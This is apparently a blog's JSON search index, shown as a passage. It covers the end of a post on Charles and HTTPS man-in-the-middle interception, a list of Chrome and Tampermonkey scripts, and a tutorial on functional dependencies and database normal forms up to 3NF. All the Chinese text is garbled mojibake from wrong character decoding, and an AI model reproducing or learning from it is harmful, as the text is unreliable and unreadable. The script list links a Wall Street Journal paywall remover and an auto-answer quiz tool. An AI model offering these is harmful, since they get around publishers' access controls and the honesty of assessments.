å¯†æ–¹å¼ï¼Œå‘ç°ä¸¤äººæ˜¯åœ¨ç”¨æ°´æ˜Ÿæ–‡è¿›è¡Œäº¤æµï¼Œç¬é—´æ°´æ˜Ÿæ–‡ä¹Ÿè¾¾åˆ°äº†åçº§ï¼Œç„¶ååœ¨æ¢ä¸Šå°ç‹çš„é”é”ä¸Šäº†ç›’å­ï¼Œè¿˜ç»™äº†å°ç‹ï¼›\n- å°ç‹æ¯«ä¸çŸ¥æƒ…ï¼Œä¹‹åä¿©äººç”¨æ°´æ˜Ÿæ–‡è¿›è¡Œäº¤æµï¼Œä½†å†…å®¹å·²ç»å…¨è¢«å°çº¢æ•è·åˆ°äº†ã€‚\n\n\n\n# 5. å‚è€ƒé“¾æ¥\n\n+ https://blog.devtang.com/2015/11/14/charles-introduction/  Charles ä»å…¥é—¨åˆ°ç²¾é€š\n+ https://www.ruanyifeng.com/blog/2014/09/illustration-ssl.html  å›¾è§£SSL/TLSåè®®\n+ https://www.laoqingcai.com/https-mitm/ ä¸­é—´äººæ”»å‡»","tags":["charles"],"categories":["è½¯ä»¶"]},{"title":"chromeæ‰©å±•å’Œæ²¹çŒ´æ’ä»¶è®°å½•","url":"%2Fp%2Fe671482a.html","content":"\nè®°å½•å¸¸ç”¨çš„chromeç›¸å…³æ’ä»¶ã€‚\n\n# 1. chromeæ‰©å±•\n\n<!-- more -->\n\n# 2. æ²¹çŒ´æ’ä»¶\n\n### 2.1 ç ´è§£\n\n+ åå°”è¡—æ—¥æŠ¥ä»˜è´¹å¢™ç§»é™¤ã€å…¨æ–‡æ˜¾ç¤ºï¼šhttps://greasyfork.org/zh-CN/scripts/448442\n+ ååŒ»ç½‘è‡ªåŠ¨ç­”é¢˜ï¼šhttps://greasyfork.org/zh-CN/scripts/436683\n\n### 2.2 å¾®ä¿¡è¯»ä¹¦\n\n+ å¾®ä¿¡è¯»ä¹¦é˜…è¯»åŠ©æ‰‹ï¼ˆç®€åŒ–ï¼‰ï¼šhttps://greasyfork.org/zh-CN/scripts/420774\n+ å¾®ä¿¡è¯»ä¹¦è‡ªåŠ¨é˜…è¯»ï¼šhttps://greasyfork.org/zh-CN/scripts/407535\n+ BetterWeReadï¼ˆå˜è‰²ï¼Œå­—ä½“ï¼‰ï¼šhttps://greasyfork.org/zh-CN/scripts/463671\n+ å¾®ä¿¡è¯»ä¹¦çœ‹æ›´å¤šï¼ˆåŠ å®½ï¼‰https://greasyfork.org/zh-CN/scripts/466749\n\n","tags":["mac"],"categories":["è½¯ä»¶"]},{"title":"æ•°æ®åº“èŒƒå¼å’Œå‡½æ•°ä¾èµ–","url":"%2Fp%2F2e33702e.html","content":"\n\n\n# 1. å‡½æ•°ä¾èµ–\n\n## 1.1 å‡½æ•°ä¾èµ–(æœ‰æˆ‘å°±èƒ½å†³å®šä½ )\n\nè®¾X,Yæ˜¯å…³ç³»Rçš„ä¸¤ä¸ªå±æ€§é›†åˆï¼Œå½“ä»»ä½•æ—¶åˆ»Rä¸­çš„ä»»æ„ä¸¤ä¸ªå…ƒç»„ä¸­çš„Xå±æ€§å€¼ç›¸åŒæ—¶ï¼Œåˆ™å®ƒä»¬çš„Yå±æ€§å€¼ä¹Ÿç›¸åŒï¼Œåˆ™ç§°Xå‡½æ•°å†³å®šYï¼Œæˆ–Yå‡½æ•°ä¾èµ–äºXã€‚\n\n+ åœ¨ä¸€ä¸ªè¡¨ä¸­,  Xçš„å€¼ç¡®å®šçš„æƒ…å†µä¸‹ï¼Œå¿…å®šèƒ½ç¡®å®šå±æ€§Yçš„å€¼,  è¿™å°±æ˜¯å‡½æ•°ä¾èµ–åå­—çš„ç”±æ¥ï¼Œç±»ä¼¼äºå‡½æ•°å…³ç³» y = f(x)\n+ å§“åå‡½æ•°ä¾èµ–äºå­¦å·ï¼Œå†™ä½œ **å­¦å· â†’ å§“å**ã€‚\n+ ä¸èƒ½è¯´å­¦å·å‡½æ•°ä¾èµ–äºå§“åã€‚å§“å ä¸èƒ½å†³å®šå­¦å·, å› ä¸ºæœ‰é‡å.\n\n<!-- more -->\n\n---\n\n## 1.2. å¹³å‡¡å‡½æ•°ä¾èµ–(æˆ‘å†³å®šçš„å€¼è¿˜æ˜¯æˆ‘è‡ªå·±å†…éƒ¨, èµ°ä¸å‡ºè‡ªæˆ‘, äºæ˜¯å¹³å‡¡çš„æˆ‘)\n\nå½“å…³ç³»ä¸­å±æ€§é›†åˆYæ˜¯å±æ€§é›†åˆXçš„å­é›†æ—¶(YâŠ†X)ï¼Œå­˜åœ¨å‡½æ•°ä¾èµ–Xâ†’Yï¼Œå³ä¸€ç»„å±æ€§å‡½æ•°å†³å®šå®ƒçš„æ‰€æœ‰å­é›†ï¼Œè¿™ç§å‡½æ•°ä¾èµ–ç§°ä¸ºå¹³å‡¡å‡½æ•°ä¾èµ–ã€‚\n\n\n\n## 1.3 éå¹³å‡¡å‡½æ•°ä¾èµ–(æˆ‘å†³å®šçš„å€¼å¤§åƒä¸–ç•Œ)\n\nå½“å…³ç³»ä¸­å±æ€§é›†åˆYä¸æ˜¯å±æ€§é›†åˆXçš„å­é›†æ—¶ï¼Œå­˜åœ¨å‡½æ•°ä¾èµ–Xâ†’Yï¼Œåˆ™ç§°è¿™ç§å‡½æ•°ä¾èµ–ä¸ºéå¹³å‡¡å‡½æ•°ä¾èµ–ã€‚\n\n---\n\n## 1.4. å®Œå…¨å‡½æ•°ä¾èµ– (æˆ‘è¦å’Œåˆ«äººä¸€èµ·å†³å®šä½ )\n\nè®¾X,Yæ˜¯å…³ç³»Rçš„ä¸¤ä¸ªå±æ€§é›†åˆï¼ŒXâ€™æ˜¯Xçš„çœŸå­é›†ï¼Œå­˜åœ¨Xâ†’Yï¼Œä½†å¯¹æ¯ä¸€ä¸ªXâ€™éƒ½æœ‰Xâ€™!â†’Yï¼Œåˆ™ç§°Yå®Œå…¨å‡½æ•°ä¾èµ–äºXã€‚\n\n+ ï¼ˆå­¦å·ï¼Œè¯¾åï¼‰Fâ†’ åˆ†æ•° ï¼ˆå› ä¸ºåŒä¸€ä¸ªçš„å­¦å·å¯¹åº”çš„åˆ†æ•°ä¸ç¡®å®šï¼ŒåŒä¸€ä¸ªè¯¾åå¯¹åº”çš„åˆ†æ•°ä¹Ÿä¸ç¡®å®šï¼‰\n+ è‡ªå·±ä¸€ä¸ªäººå†³å®šä¸äº†, éœ€è¦å…±åŒå†³å®š\n\n\n\n## 1.5. éƒ¨åˆ†å‡½æ•°ä¾èµ–(æˆ‘çš„ä¸€éƒ¨åˆ†å°±èƒ½å†³å®šä½ )\n\nè®¾X,Yæ˜¯å…³ç³»Rçš„ä¸¤ä¸ªå±æ€§é›†åˆï¼Œå­˜åœ¨Xâ†’Yï¼Œè‹¥Xâ€™æ˜¯Xçš„çœŸå­é›†ï¼Œå­˜åœ¨Xâ€™â†’Yï¼Œåˆ™ç§°Yéƒ¨åˆ†å‡½æ•°ä¾èµ–äºXã€‚\n\n+ (å­¦å·ï¼Œè¯¾åï¼‰ Pâ†’ å§“å\n+ æˆ‘è‡ªå·±çš„ä¸€éƒ¨åˆ†å°±å¯ä»¥å†³å®š\n\n\n\n## 1.6. ä¼ é€’å‡½æ•°ä¾èµ– (æˆ‘å¯ä»¥é—´æ¥å†³å®šä½ )\n\nè®¾X,Y,Zæ˜¯å…³ç³»Rä¸­äº’ä¸ç›¸åŒçš„å±æ€§é›†åˆï¼Œå­˜åœ¨Xâ†’Y(Y !â†’X),Yâ†’Zï¼Œåˆ™ç§°Zä¼ é€’å‡½æ•°ä¾èµ–äºXã€‚\n\n\n\n# 2. ç å’Œä¸»å±æ€§\n\n## 2.1 ç \n\nè®¾ K ä¸ºæŸè¡¨ä¸­çš„ä¸€ä¸ªå±æ€§æˆ–å±æ€§ç»„ï¼Œè‹¥é™¤ K ä¹‹å¤–çš„æ‰€æœ‰å±æ€§éƒ½å®Œå…¨å‡½æ•°ä¾èµ–äº Kï¼ˆè¿™ä¸ªâ€œå®Œå…¨â€ä¸è¦æ¼äº†ï¼‰ï¼Œé‚£ä¹ˆæˆ‘ä»¬ç§° K ä¸º**å€™é€‰ç **ï¼Œç®€ç§°ä¸º**ç **ã€‚\n\nåœ¨å®é™…ä¸­æˆ‘ä»¬é€šå¸¸å¯ä»¥ç†è§£ä¸ºï¼šå‡å¦‚å½“ K ç¡®å®šçš„æƒ…å†µä¸‹ï¼Œè¯¥è¡¨é™¤ K ä¹‹å¤–çš„æ‰€æœ‰å±æ€§çš„å€¼ä¹Ÿå°±éšä¹‹ç¡®å®šï¼Œé‚£ä¹ˆ K å°±æ˜¯ç ã€‚ä¸€å¼ è¡¨ä¸­å¯ä»¥æœ‰è¶…è¿‡ä¸€ä¸ªç ã€‚ï¼ˆå®é™…åº”ç”¨ä¸­ä¸ºäº†æ–¹ä¾¿ï¼Œé€šå¸¸é€‰æ‹©å…¶ä¸­çš„ä¸€ä¸ªç ä½œä¸ºä¸»ç ï¼‰\n\n+ 2NFçš„å›¾ **(å­¦å·ã€è¯¾åï¼‰**è¿™ä¸ªå±æ€§ç»„å°±æ˜¯ç ã€‚è¯¥è¡¨ä¸­æœ‰ä¸”ä»…æœ‰è¿™ä¸€ä¸ªç ã€‚\n\n  \n\n## 2.2 ä¸»å±æ€§\n\nåŒ…å«åœ¨ä»»ä½•ä¸€ä¸ªç ä¸­çš„å±æ€§æˆä¸ºä¸»å±æ€§ã€‚\n\n2NFçš„å›¾ä¸»å±æ€§å°±æœ‰ä¸¤ä¸ªï¼Œ**å­¦å·** ä¸ **è¯¾å**ã€‚\n\n\n\n# 3. èŒƒå¼\n\nå…³ç³»æ•°æ®åº“æœ‰å…­ç§ï¼Œ1NFï¼Œ2NFï¼Œ3NFï¼ŒBCNFï¼Œ4NFï¼Œ5NFã€‚\n\n## 3.1 1NF (é—®é¢˜: åŒå­—æ®µå†…å®¹é‡å¤, è¦æ‹†è¡¨->2NF)\n\nç¬¦åˆ1NFçš„å…³ç³»ä¸­çš„æ¯ä¸ªå±æ€§éƒ½ä¸å¯å†åˆ†ã€‚ä¸‹å›¾å°±ä¸ç¬¦åˆ1NFçš„è¦æ±‚.\n\n![1](æ•°æ®åº“èŒƒå¼å’Œå‡½æ•°ä¾èµ–/1.png)\n\n1NFæ˜¯å…³ç³»æ¨¡å¼åº”å…·å¤‡çš„æœ€èµ·ç çš„æ¡ä»¶ï¼Œå¦‚æœæ•°æ®åº“è®¾è®¡ä¸èƒ½æ»¡è¶³ç¬¬ä¸€èŒƒå¼ï¼Œå°±ä¸èƒ½ç§°ä¸ºå…³ç³»å‹æ•°æ®åº“ã€‚å…³ç³»æ•°æ®åº“è‡ªå¸¦1NF\n\n![1](æ•°æ®åº“èŒƒå¼å’Œå‡½æ•°ä¾èµ–/2.png)\n\n\n\n## 3.2 2NF (é—®é¢˜: éä¸»å±æ€§ä¸åŒå­—æ®µä¹‹é—´å…³è”, è¦æ‹†è¡¨->3NF)\n\n![1](æ•°æ®åº“èŒƒå¼å’Œå‡½æ•°ä¾èµ–/3.png)\n\n+ æ¯ä¸€åå­¦ç”Ÿçš„å­¦å·ã€å§“åã€ç³»åã€ç³»ä¸»ä»»è¿™äº›æ•°æ®é‡å¤å¤šæ¬¡ã€‚æ¯ä¸ªç³»ä¸å¯¹åº”çš„ç³»ä¸»ä»»çš„æ•°æ®ä¹Ÿé‡å¤å¤šæ¬¡â€”â€”**æ•°æ®å†—ä½™è¿‡å¤§** \n\n+ å‡å¦‚å­¦æ ¡æ–°å»ºäº†ä¸€ä¸ªç³»ï¼Œä½†æ˜¯æš‚æ—¶è¿˜æ²¡æœ‰æ‹›æ”¶ä»»ä½•å­¦ç”Ÿï¼ˆæ¯”å¦‚3æœˆä»½å°±æ–°å»ºäº†ï¼Œä½†è¦ç­‰åˆ°8æœˆä»½æ‰æ‹›ç”Ÿï¼‰ï¼Œé‚£ä¹ˆæ˜¯æ— æ³•å°†ç³»åä¸ç³»ä¸»ä»»çš„æ•°æ®å•ç‹¬åœ°æ·»åŠ åˆ°æ•°æ®è¡¨ä¸­å»çš„â€”â€”**æ’å…¥å¼‚å¸¸**\n\n+ å‡å¦‚å°†æŸä¸ªç³»ä¸­æ‰€æœ‰å­¦ç”Ÿç›¸å…³çš„è®°å½•éƒ½åˆ é™¤ï¼Œé‚£ä¹ˆæ‰€æœ‰ç³»ä¸ç³»ä¸»ä»»çš„æ•°æ®ä¹Ÿå°±éšä¹‹æ¶ˆå¤±äº†ï¼ˆä¸€ä¸ªç³»æ‰€æœ‰å­¦ç”Ÿéƒ½æ²¡æœ‰äº†ï¼Œå¹¶ä¸è¡¨ç¤ºè¿™ä¸ªç³»å°±æ²¡æœ‰äº†ï¼‰ã€‚â€”â€”**åˆ é™¤å¼‚å¸¸**\n\n+ å‡å¦‚æå°æ˜è½¬ç³»åˆ°æ³•å¾‹ç³»ï¼Œé‚£ä¹ˆä¸ºäº†ä¿è¯æ•°æ®åº“ä¸­æ•°æ®çš„ä¸€è‡´æ€§ï¼Œéœ€è¦ä¿®æ”¹ä¸‰æ¡è®°å½•ä¸­ç³»ä¸ç³»ä¸»ä»»çš„æ•°æ®ã€‚â€”â€”**ä¿®æ”¹å¼‚å¸¸**ã€‚\n\n  æ­£å› ä¸ºä»…ç¬¦åˆ1NFçš„æ•°æ®åº“è®¾è®¡å­˜åœ¨ç€è¿™æ ·é‚£æ ·çš„é—®é¢˜ï¼Œæˆ‘ä»¬éœ€è¦æé«˜è®¾è®¡æ ‡å‡†ï¼Œå»æ‰å¯¼è‡´ä¸Šè¿°å››ç§é—®é¢˜çš„å› ç´ ï¼Œä½¿å…¶ç¬¦åˆæ›´é«˜ä¸€çº§çš„èŒƒå¼ï¼ˆ2NFï¼‰ï¼Œè¿™å°±æ˜¯æ‰€è°“çš„â€œè§„èŒƒåŒ–â€ã€‚\n\n  \n\n  #### 3.2.1  åˆ¤æ–­æ˜¯å¦ç¬¦åˆ2NF\n\n  æ ¹æ®2NFçš„å®šä¹‰ï¼Œåˆ¤æ–­çš„ä¾æ®å®é™…ä¸Šå°±æ˜¯çœ‹æ•°æ®è¡¨ä¸­**æ˜¯å¦å­˜åœ¨éä¸»å±æ€§å¯¹äºç çš„éƒ¨åˆ†å‡½æ•°ä¾èµ–**ã€‚è‹¥å­˜åœ¨ï¼Œåˆ™æ•°æ®è¡¨æœ€é«˜åªç¬¦åˆ1NFçš„è¦æ±‚ï¼Œè‹¥ä¸å­˜åœ¨ï¼Œåˆ™ç¬¦åˆ2NFçš„è¦æ±‚ã€‚åˆ¤æ–­çš„æ–¹æ³•æ˜¯ï¼š\n\n  \n\n  > ç¬¬ä¸€æ­¥ï¼šæ‰¾å‡ºæ•°æ®è¡¨ä¸­æ‰€æœ‰çš„**ç **ã€‚\n  \n  + æŸ¥çœ‹æ‰€æœ‰æ¯ä¸€å•ä¸ªå±æ€§ï¼Œå½“å®ƒçš„å€¼ç¡®å®šäº†ï¼Œæ˜¯å¦å‰©ä¸‹çš„æ‰€æœ‰å±æ€§å€¼éƒ½èƒ½ç¡®å®šã€‚\n  + æŸ¥çœ‹æ‰€æœ‰åŒ…å«æœ‰ä¸¤ä¸ªå±æ€§çš„å±æ€§ç»„ï¼Œå½“å®ƒçš„å€¼ç¡®å®šäº†ï¼Œæ˜¯å¦å‰©ä¸‹çš„æ‰€æœ‰å±æ€§å€¼éƒ½èƒ½ç¡®å®šã€‚\n+ ä¾æ¬¡æŸ¥çœ‹3ä¸ª4ä¸ª5ä¸ª.....\n  + çœ‹èµ·æ¥å¾ˆéº»çƒ¦æ˜¯å§ï¼Œä½†æ˜¯è¿™é‡Œæœ‰ä¸€ä¸ªè¯€çªï¼Œå°±æ˜¯å‡å¦‚Aæ˜¯ç ï¼Œé‚£ä¹ˆæ‰€æœ‰åŒ…å«äº†Açš„å±æ€§ç»„ï¼Œå¦‚ï¼ˆAï¼ŒBï¼‰ã€ï¼ˆAï¼ŒCï¼‰ã€ï¼ˆAï¼ŒBï¼ŒCï¼‰ç­‰ç­‰ï¼Œéƒ½ä¸æ˜¯ç äº†ï¼ˆå› ä¸ºä½œä¸ºç çš„è¦æ±‚é‡Œæœ‰ä¸€ä¸ªâ€œ**å®Œå…¨**å‡½æ•°ä¾èµ–â€ï¼‰ã€‚\n\n  ![1](æ•°æ®åº“èŒƒå¼å’Œå‡½æ•°ä¾èµ–/4.png)\n\n  è¿™ä¸€æ­¥å®Œæˆä»¥åï¼Œå¯ä»¥å¾—åˆ°ï¼Œè¡¨3çš„ç åªæœ‰ä¸€ä¸ªï¼Œå°±æ˜¯**ï¼ˆå­¦å·ã€è¯¾åï¼‰**ã€‚å­¦å·å¹¶ä¸èƒ½ç›´æ¥å†³å®šåˆ†æ•°, æ‰€ä»¥å­¦å·+è¯¾åèƒ½å†³å®šä¸€åˆ‡\n\n  \n\n  > ç¬¬äºŒæ­¥ï¼šæ ¹æ®ç¬¬ä¸€æ­¥æ‰€å¾—åˆ°çš„ç ï¼Œæ‰¾å‡ºæ‰€æœ‰çš„**ä¸»å±æ€§**ã€‚\n  \n  ä¸»å±æ€§æœ‰ä¸¤ä¸ªï¼š**å­¦å·** ä¸ **è¯¾å**\n  \n  > ç¬¬ä¸‰æ­¥ï¼šæ•°æ®è¡¨ä¸­ï¼Œé™¤å»æ‰€æœ‰çš„ä¸»å±æ€§ï¼Œå‰©ä¸‹çš„å°±éƒ½æ˜¯**éä¸»å±æ€§**äº†ã€‚\n  \n  éä¸»å±æ€§æœ‰å››ä¸ªï¼š**å§“å**ã€**ç³»å**ã€**ç³»ä¸»ä»»**ã€**åˆ†æ•°**\n  \n  > ç¬¬å››æ­¥ï¼šæŸ¥çœ‹æ˜¯å¦å­˜åœ¨éä¸»å±æ€§å¯¹ç çš„**éƒ¨åˆ†å‡½æ•°ä¾èµ–**ã€‚\n  \n  å¯¹äº**ï¼ˆå­¦å·ï¼Œè¯¾åï¼‰ â†’ å§“å**ï¼Œæœ‰ **å­¦å· â†’ å§“å**ï¼Œ\t\tå­˜åœ¨éä¸»å±æ€§ å§“å å¯¹ç **ï¼ˆå­¦å·ï¼Œè¯¾åï¼‰**çš„éƒ¨åˆ†å‡½æ•°ä¾èµ–ã€‚\n  å¯¹äº**ï¼ˆå­¦å·ï¼Œè¯¾åï¼‰ â†’ ç³»å**ï¼Œæœ‰ **å­¦å· â†’ ç³»å**ï¼Œ\t\tå­˜åœ¨éä¸»å±æ€§ ç³»å å¯¹ç **ï¼ˆå­¦å·ï¼Œè¯¾åï¼‰**çš„éƒ¨åˆ†å‡½æ•°ä¾èµ–ã€‚\n  å¯¹äº**ï¼ˆå­¦å·ï¼Œè¯¾åï¼‰ â†’ ç³»ä¸»ä»»**ï¼Œæœ‰ **å­¦å· â†’ ç³»ä¸»ä»»**ï¼Œå­˜åœ¨éä¸»å±æ€§ ç³»ä¸»ä»» å¯¹ç **ï¼ˆå­¦å·ï¼Œè¯¾åï¼‰**çš„éƒ¨åˆ†å‡½æ•°ä¾èµ–ã€‚\n  \n  æ‰€ä»¥è¡¨3å­˜åœ¨éä¸»å±æ€§å¯¹äºç çš„éƒ¨åˆ†å‡½æ•°ä¾èµ–ï¼Œæœ€é«˜åªç¬¦åˆ1NFçš„è¦æ±‚ï¼Œä¸ç¬¦åˆ2NFçš„è¦æ±‚ã€‚\n\n\n\n#### 3.2.2  æ‹†è¡¨ç¬¦åˆ2NF\n\nä¸ºäº†ç¬¦åˆ2NFçš„è¦æ±‚ï¼Œæˆ‘ä»¬å¿…é¡»æ¶ˆé™¤è¿™äº›éƒ¨åˆ†å‡½æ•°ä¾èµ–ï¼Œåªæœ‰ä¸€ä¸ªåŠæ³•ï¼Œå°±æ˜¯å°†å¤§æ•°æ®è¡¨æ‹†åˆ†æˆä¸¤ä¸ªæˆ–è€…æ›´å¤šä¸ªæ›´å°çš„æ•°æ®è¡¨ï¼Œåœ¨æ‹†åˆ†çš„è¿‡ç¨‹ä¸­ï¼Œè¦è¾¾åˆ°æ›´é«˜ä¸€çº§èŒƒå¼çš„è¦æ±‚ï¼Œè¿™ä¸ªè¿‡ç¨‹å«åšâ€æ¨¡å¼åˆ†è§£â€œã€‚æ¨¡å¼åˆ†è§£çš„æ–¹æ³•ä¸æ˜¯å”¯ä¸€çš„ï¼Œä»¥ä¸‹æ˜¯å…¶ä¸­ä¸€ç§æ–¹æ³•ï¼š\né€‰è¯¾è¡¨ï¼ˆå­¦å·ï¼Œè¯¾åï¼Œåˆ†æ•°ï¼‰\nå­¦ç”Ÿè¡¨ï¼ˆå­¦å·ï¼Œå§“åï¼Œç³»åï¼Œç³»ä¸»ä»»ï¼‰\n\næˆ‘ä»¬å…ˆæ¥åˆ¤æ–­ä»¥ä¸‹ï¼Œ**é€‰è¯¾**è¡¨ä¸**å­¦ç”Ÿ**è¡¨ï¼Œæ˜¯å¦ç¬¦åˆäº†2NFçš„è¦æ±‚ï¼Ÿ\n\nå¯¹äº**é€‰è¯¾**è¡¨ï¼Œå…¶ç æ˜¯**ï¼ˆå­¦å·ï¼Œè¯¾åï¼‰**ï¼Œä¸»å±æ€§æ˜¯**å­¦å·**å’Œ**è¯¾å**ï¼Œéä¸»å±æ€§æ˜¯**åˆ†æ•°**ï¼Œ**å­¦å·**ç¡®å®šï¼Œå¹¶ä¸èƒ½å”¯ä¸€ç¡®å®š**åˆ†æ•°**ï¼Œ**è¯¾å**ç¡®å®šï¼Œä¹Ÿä¸èƒ½å”¯ä¸€ç¡®å®š**åˆ†æ•°**ï¼Œæ‰€ä»¥ä¸å­˜åœ¨éä¸»å±æ€§**åˆ†æ•°**å¯¹äºç  **ï¼ˆå­¦å·ï¼Œè¯¾åï¼‰**çš„éƒ¨åˆ†å‡½æ•°ä¾èµ–ï¼Œæ‰€ä»¥æ­¤è¡¨ç¬¦åˆ2NFçš„è¦æ±‚ã€‚\n\nå¯¹äº**å­¦ç”Ÿ**è¡¨ï¼Œå…¶ç æ˜¯**å­¦å·ï¼Œ**ä¸»å±æ€§æ˜¯**å­¦å·**ï¼Œéä¸»å±æ€§æ˜¯**å§“åã€ç³»å**å’Œ**ç³»ä¸»ä»»**ï¼Œå› ä¸ºç åªæœ‰ä¸€ä¸ªå±æ€§ï¼Œæ‰€ä»¥ä¸å¯èƒ½å­˜åœ¨éä¸»å±æ€§å¯¹äºç  çš„éƒ¨åˆ†å‡½æ•°ä¾èµ–ï¼Œæ‰€ä»¥æ­¤è¡¨ç¬¦åˆ2NFçš„è¦æ±‚ã€‚\n\n![1](æ•°æ®åº“èŒƒå¼å’Œå‡½æ•°ä¾èµ–/5.png)\n\n\n\n#### 3.2.3 å®šä¹‰\n\nå¦‚æœå…³ç³»æ¨¡å¼Ræ˜¯1NFï¼Œä¸”æ¯ä¸€ä¸ªéä¸»å±æ€§å®Œå…¨ä¾èµ–äºå€™é€‰å»ºï¼Œé‚£ä¹ˆå°±ç§°Ræ˜¯ç¬¬äºŒèŒƒå¼ã€‚\n\nç¬¬äºŒèŒƒå¼è¦æ»¡è¶³çš„æ¡ä»¶ï¼šé¦–å…ˆè¦æ»¡è¶³ç¬¬ä¸€èŒƒå¼ï¼Œå…¶æ¬¡æ¯ä¸€ä¸ªéä¸»å±æ€§è¦**å®Œå…¨å‡½æ•°**ä¾èµ–äºå€™é€‰é”®ï¼Œæˆ–è€…æ˜¯ä¸»é”®ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæ¯ä¸ªéä¸»å±æ€§æ˜¯ç”±æ•´ä¸ªä¸»é”®å‡½æ•°å†³å®šçš„ï¼Œè€Œä¸èƒ½æœ‰ä¸»é”®çš„ä¸€éƒ¨åˆ†æ¥å†³å®šã€‚\n\n\n\n## 3.3 3NF (é—®é¢˜: ä¸»å±æ€§ä¸åŒå­—æ®µä¹‹é—´å…³è”, è¦æ‹†è¡¨->BCNF)\n\n![1](æ•°æ®åº“èŒƒå¼å’Œå‡½æ•°ä¾èµ–/6.png)\n\n+ æå°æ˜è½¬ç³»åˆ°æ³•å¾‹ç³»\n  åªéœ€è¦ä¿®æ”¹ä¸€æ¬¡æå°æ˜å¯¹åº”çš„ç³»çš„å€¼å³å¯ã€‚â€”â€”æœ‰æ”¹è¿›\n\n+ æ•°æ®å†—ä½™æ˜¯å¦å‡å°‘äº†ï¼Ÿ\n  å­¦ç”Ÿçš„å§“åã€ç³»åä¸ç³»ä¸»ä»»ï¼Œä¸å†åƒä¹‹å‰ä¸€æ ·é‡å¤é‚£ä¹ˆå¤šæ¬¡äº†ã€‚â€”â€”æœ‰æ”¹è¿›\n\n+ åˆ é™¤æŸä¸ªç³»ä¸­æ‰€æœ‰çš„å­¦ç”Ÿè®°å½•\n  è¯¥ç³»çš„ä¿¡æ¯ä»ç„¶å…¨éƒ¨ä¸¢å¤±ã€‚â€”â€”æ— æ”¹è¿›\n\n+ æ’å…¥ä¸€ä¸ªå°šæ— å­¦ç”Ÿçš„æ–°ç³»çš„ä¿¡æ¯ã€‚\n  å› ä¸ºå­¦ç”Ÿè¡¨çš„ç æ˜¯å­¦å·ï¼Œä¸èƒ½ä¸ºç©ºï¼Œæ‰€ä»¥æ­¤æ“ä½œä¸è¢«å…è®¸ã€‚â€”â€”æ— æ”¹è¿›\n\n  \n\næ‰€ä»¥è¯´ï¼Œä»…ä»…ç¬¦åˆ2NFçš„è¦æ±‚ï¼Œå¾ˆå¤šæƒ…å†µä¸‹è¿˜æ˜¯ä¸å¤Ÿçš„ï¼Œè€Œå‡ºç°é—®é¢˜çš„åŸå› ï¼Œåœ¨äºä»ç„¶å­˜åœ¨éä¸»å±æ€§**ç³»ä¸»ä»»**å¯¹äºç **å­¦å·**çš„ä¼ é€’å‡½æ•°ä¾èµ–ã€‚ä¸ºäº†èƒ½è¿›ä¸€æ­¥è§£å†³è¿™äº›é—®é¢˜ï¼Œæˆ‘ä»¬è¿˜éœ€è¦å°†ç¬¦åˆ2NFè¦æ±‚çš„æ•°æ®è¡¨æ”¹è¿›ä¸ºç¬¦åˆ3NFçš„è¦æ±‚ã€‚\n\n**ç¬¬ä¸‰èŒƒå¼ï¼ˆ3NFï¼‰** **3NFåœ¨2NFçš„åŸºç¡€ä¹‹ä¸Šï¼Œæ¶ˆé™¤äº†éä¸»å±æ€§å¯¹äºç çš„ä¼ é€’å‡½æ•°ä¾èµ–**ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œ å¦‚æœå­˜åœ¨éä¸»å±æ€§å¯¹äºç çš„ä¼ é€’å‡½æ•°ä¾èµ–ï¼Œåˆ™ä¸ç¬¦åˆ3NFçš„è¦æ±‚ã€‚\n\n\n\n#### 3.3.1 åˆ¤æ–­æ˜¯å¦ç¬¦åˆ3NF\n\næ¥ä¸‹æ¥æˆ‘ä»¬çœ‹çœ‹è¡¨ä¸­çš„è®¾è®¡ï¼Œæ˜¯å¦ç¬¦åˆ3NFçš„è¦æ±‚ã€‚\n\n+ å¯¹äº**é€‰è¯¾**è¡¨ï¼Œä¸»ç ä¸ºï¼ˆå­¦å·ï¼Œè¯¾åï¼‰ï¼Œä¸»å±æ€§ä¸º**å­¦å·**å’Œ**è¯¾åï¼Œ**éä¸»å±æ€§åªæœ‰ä¸€ä¸ªï¼Œä¸ºåˆ†æ•°ï¼Œä¸å¯èƒ½å­˜åœ¨ä¼ é€’å‡½æ•°ä¾èµ–ï¼Œæ‰€ä»¥**é€‰è¯¾**è¡¨çš„è®¾è®¡ï¼Œç¬¦åˆ3NFçš„è¦æ±‚ã€‚\n\n+ å¯¹äº**å­¦ç”Ÿ**è¡¨ï¼Œä¸»ç ä¸º**å­¦å·**ï¼Œä¸»å±æ€§ä¸º**å­¦å·**ï¼Œéä¸»å±æ€§ä¸º**å§“å**ã€**ç³»å**å’Œ**ç³»ä¸»ä»»**ã€‚å› ä¸º å­¦å· â†’ ç³»åï¼ŒåŒæ—¶ ç³»å â†’ ç³»ä¸»ä»»ï¼Œæ‰€ä»¥å­˜åœ¨éä¸»å±æ€§**ç³»ä¸»ä»»**å¯¹äºç **å­¦å·**çš„ä¼ é€’å‡½æ•°ä¾èµ–ï¼Œæ‰€ä»¥**å­¦ç”Ÿ**è¡¨çš„è®¾è®¡ï¼Œä¸ç¬¦åˆ3NFçš„è¦æ±‚ã€‚ã€‚\n\n  \n\n#### 3.3.2  æ‹†è¡¨ç¬¦åˆ3NF\n\nä¸ºäº†è®©æ•°æ®è¡¨è®¾è®¡è¾¾åˆ°3NFï¼Œæˆ‘ä»¬å¿…é¡»è¿›ä¸€æ­¥è¿›è¡Œæ¨¡å¼åˆ†è§£ä¸ºä»¥ä¸‹å½¢å¼ï¼š\né€‰è¯¾ï¼ˆå­¦å·ï¼Œè¯¾åï¼Œåˆ†æ•°ï¼‰\nå­¦ç”Ÿï¼ˆå­¦å·ï¼Œå§“åï¼Œç³»åï¼‰\nç³»ï¼ˆç³»åï¼Œç³»ä¸»ä»»ï¼‰\n\n\n\n+ å¯¹äº**é€‰è¯¾**è¡¨ï¼Œç¬¦åˆ3NFçš„è¦æ±‚ï¼Œä¹‹å‰å·²ç»åˆ†æè¿‡äº†ã€‚\n\n+ å¯¹äº**å­¦ç”Ÿ**è¡¨ï¼Œç ä¸º**å­¦å·**ï¼Œä¸»å±æ€§ä¸º**å­¦å·**ï¼Œéä¸»å±æ€§ä¸º**ç³»å**ï¼Œä¸å¯èƒ½å­˜åœ¨éä¸»å±æ€§å¯¹äºç çš„ä¼ é€’å‡½æ•°ä¾èµ–ï¼Œæ‰€ä»¥ç¬¦åˆ3NFçš„è¦æ±‚ã€‚\n\n+ å¯¹äº**ç³»**è¡¨ï¼Œç 